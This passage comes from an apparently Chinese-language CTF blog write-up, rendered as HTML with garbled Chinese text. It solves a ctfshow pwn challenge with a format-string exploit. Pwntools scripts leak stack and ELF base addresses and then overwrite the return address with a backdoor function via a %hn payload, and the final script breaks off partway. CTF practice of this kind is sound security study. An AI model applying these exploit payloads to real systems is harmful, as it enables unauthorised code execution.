	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/347_hu_3af3fac172898358.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/347_hu_715bfcf473a3797a.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="64"
		data-flex-basis="154px"
	
></p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = remote(&#39;pwn.challenge.ctf.show&#39;,28234)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;11 11 00&#39;</span><span class="p">)</span>		
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&#34;</span><span class="p">)</span>			
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>			
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;%7$n&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&#34;</span><span class="p">)</span>			
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>			
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;%p-%p-%p-%p-%p-%p-%p-%p-%p-%p&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&#34;</span><span class="p">)</span>			
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/348.png"
	width="1918"
	height="878"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/348_hu_256567350f88766b.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/348_hu_dcfc2902dfbc8d48.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="218"
		data-flex-basis="524px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªæˆ‘ä»¬å¯ä»¥å¤šæ¬¡åˆ©ç”¨è¿™ä¸ª<code>fmt_attack</code>å‡½æ•°äº†ï¼Œå¯ä»¥å¤šæ¬¡åˆ©ç”¨è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾åé—¨å‡½æ•°çš„åœ°å€äº†</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/350.png"
	width="885"
	height="454"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/350_hu_527b425f2f1da430.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/350_hu_6e4bba6b272343a4.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="194"
		data-flex-basis="467px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">push</span>    <span class="nb">rbp</span>          <span class="c1">; å‹æ ˆï¼Œä¿å­˜è°ƒç”¨è€…çš„ rbpï¼ˆå ç”¨ 8 å­—èŠ‚ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span>     <span class="nb">rbp</span><span class="p">,</span> <span class="nb">rsp</span>     <span class="c1">; èµ‹å€¼ï¼Œè®¾ç½®æ–°çš„æ ˆå¸§åŸºå€</span>
</span></span><span class="line"><span class="cl"><span class="nf">sub</span>     <span class="nb">rsp</span><span class="p">,</span> <span class="mh">20h</span>     <span class="c1">; å‡ï¼Œåˆ†é… 0x20ï¼ˆ32ï¼‰å­—èŠ‚çš„æ ˆç©ºé—´</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/349.png"
	width="1215"
	height="795"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/349_hu_5e62b09534050cd6.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/349_hu_4cc670ca412aa1da.png 1024w"
	loading="lazy"
	
		alt="å±€éƒ¨æ ˆå¸§"
	
	
		class="gallery-image" 
		data-flex-grow="152"
		data-flex-basis="366px"
	
></p>
<p>æ‰€ä»¥èƒ½å¾—çŸ¥mainå‡½æ•°çš„è¿”å›åœ°å€<code>ret = main_rbp - 0x28</code></p>
<p>æ‰¾rbpåœ°å€çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»é‡ï¼š16</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/351.png"
	width="1808"
	height="88"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/351_hu_167e7c03c4fd1c0b.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/351_hu_b96870c1001b61af.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="2054"
		data-flex-basis="4930px"
	
></p>
<p>è¿™æ—¶å°±å¯ä»¥æ³„éœ²rbpçš„çœŸå®åœ°å€</p>
<blockquote>
<p>PIE ä¸ä¼šå½±å“æ ˆåœ°å€ï¼Œä½†ä¼šå½±å“ â€œåé—¨å‡½æ•°çš„åœ°å€è®¡ç®—â€ï¼Œè¿™å’Œä½ æ³„éœ²çš„ <code>main_rbp</code> æ— å…³ â€”â€”<code>main_rbp</code> æ˜¯æ ˆåœ°å€ï¼ŒPIE ä¸å¹²é¢„ï¼Œæ³„éœ²åå¯ç›´æ¥ç”¨ã€‚</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = remote(&#39;pwn.challenge.ctf.show&#39;,28234)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;11 11 22&#39;</span><span class="p">)</span>		
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt;&#34;</span><span class="p">)</span>			
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>			
</span></span><span class="line"><span class="cl">			
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;%7$n-%16$p&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;-&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x28</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;è¿”å›åœ°å€å­˜å‚¨ä½ç½®ï¼š&#34;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ret</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å—ASLRä¿æŠ¤å½±å“ï¼Œæ¯æ¬¡è¾“å‡ºçš„å€¼éƒ½æ˜¯éšæœºçš„ï¼Œä½†ä¸å½±å“æˆ‘ä»¬åˆ©ç”¨ï¼Œå› ä¸ºè¿™ä¸ªå€¼æ˜¯åœ¨åŒä¸€è¿›ç¨‹ä¸‹æƒ…å†µä¸‹å»åˆ©ç”¨çš„ã€‚</p>
<p>retåœ°å€å·²ç»æœ‰äº†ï¼Œå¯ä»¥éšæ—¶åˆ©ç”¨è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å»è¿›è¡Œä»»æ„è¦†å†™ï¼Œå†™ä¸Šåé—¨å‡½æ•°çš„çœŸå®åœ°å€ã€‚</p>
<p>ç°åœ¨æ¥æ‰¾åé—¨å‡½æ•°çš„çœŸå®åœ°å€ï¼ˆå› ä¸ºå¼€å¯äº†PIEä¿æŠ¤ï¼Œéœ€è¦è®¡ç®—å‡ºelfåŸºå€ï¼Œè¿™æ ·åŠ ä¸Šåé—¨å‡½æ•°çš„elfåç§»é‡å°±èƒ½æ¨å‡ºè¿™ä¸ªåé—¨å‡½æ•°çš„çœŸå®åœ°å€ï¼Œä»è€Œè¿›è¡Œè°ƒç”¨getshelläº†ï¼‰ï¼š</p>
<p>æˆ‘ä»¬ç°åœ¨æ¥æ ˆä¸Šæ‰¾ä¸ªåœ°å€æ¥æ³„éœ²ï¼Œå¥½è®¡ç®— ELFçš„åŸºåœ°å€ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/352.png"
	width="1918"
	height="878"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/352_hu_7e7953775b6edc59.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/352_hu_3e6ee6c233685403.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="218"
		data-flex-basis="524px"
	
></p>
<p>çœ‹å›IDAï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/353.png"
	width="1506"
	height="606"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/353_hu_96573bb2e06e5788.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/353_hu_a9e1e8db78df1e8d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="248"
		data-flex-basis="596px"
	
></p>
<p>è¿™é‡Œæœ‰ä¸ªå›°æƒ‘ç‚¹ï¼šå°±æ˜¯gdbç•Œé¢çœ‹åˆ°çš„æ˜¯main+118ï¼Œè€Œè¿™æ˜¯main+76ï¼Œè¿™æ˜¯æ··æ·†ç‚¹ï¼š</p>
<ul>
<li>åæ±‡ç¼–ä¸­ <code>main+76</code> çš„ <code>76</code> æ˜¯<strong>åå…­è¿›åˆ¶</strong>ï¼ˆ<code>0x76</code>ï¼‰ï¼›</li>
<li>gdb è°ƒè¯•ç•Œé¢çš„ <code>main+118</code> çš„ <code>118</code> æ˜¯<strong>åè¿›åˆ¶</strong>ã€‚</li>
</ul>
<p>ç”¨fmtargæŸ¥çœ‹æ ¼å¼åŒ–å­—ç¬¦ä¸²åç§»ï¼Œå¾—åˆ°<code>17 (&quot;\%16$p&quot;)</code>ï¼šæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬ 17 ä¸ªå‚æ•°ï¼Œ<code>%17$p</code>æ³„éœ²å‡ºæ¥ã€‚</p>
<p>çœ‹mainå‡½æ•°çš„æ±‡ç¼–ä»£ç ï¼Œå¯¹åº”çš„elfåç§»åœ°å€æ˜¯0x102Cã€‚</p>
<p><code>æœ¬ç¨‹åºçš„elfåŸºå€ = çœŸå®åœ°å€ - ç›¸å¯¹çš„åç§»åœ°å€</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%7$n-%17$p&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ret_value</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf_base</span> <span class="o">=</span> <span class="n">ret_value</span> <span class="o">-</span> <span class="mh">0x102C</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åˆ°æœ€åä¸€æ­¥äº†ï¼Œä»»æ„å†™ï¼Œå¯¹retçš„åœ°å€è¿›è¡Œæ“ä½œï¼ŒæŠŠ<code>ret_value</code>æ”¹ä¸ºåé—¨åœ°å€ï¼Œgdbè°ƒè¯•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = remote(&#39;pwn.challenge.ctf.show&#39;,28234)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;00 00 00&#39;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt;&#34;</span><span class="p">)</span>     
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>        
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;%7$n-%16$p&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;-&#39;</span><span class="p">)</span>        
</span></span><span class="line"><span class="cl"><span class="n">ret_address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x28</span>  
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">ret_address</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt;&#34;</span><span class="p">)</span>      
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>         
</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;%7$n-%17$p&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;-&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ret_value</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl"><span class="n">elf_base</span> <span class="o">=</span> <span class="n">ret_value</span> <span class="o">-</span> <span class="mh">0x102c</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf_base</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt;&#34;</span><span class="p">)</span>    
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>         
</span></span><span class="line"><span class="cl"><span class="n">payload3</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s1">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">elf_base</span><span class="o">+</span><span class="mh">0xf56</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffff</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;c%1$hn&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">8</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>				
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/354.png"
	width="1894"
	height="464"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/354_hu_e35bc369ed8d9b7f.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/354_hu_c35cab1ec5c83ea8.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="408"
		data-flex-basis="979px"
	
></p>
<p>æ‰¾åˆ°äº†åœ°å€çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²åç§»ã€‚</p>
<p>æ‰€ä»¥<code>payload3 = ('%'+str((elf_base+0xf56)&amp;0xffff).encode()+b'c%10$hn').ljust(0x10,b'a') + p64(ret_address)</code></p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span> <span class="mi">28234</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;00 00 00&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;%7$n-%16$p&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;-&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x28</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;%7$n-%17$p&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;-&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ret_value</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf_base</span> <span class="o">=</span> <span class="n">ret_value</span> <span class="o">-</span> <span class="mh">0x102c</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
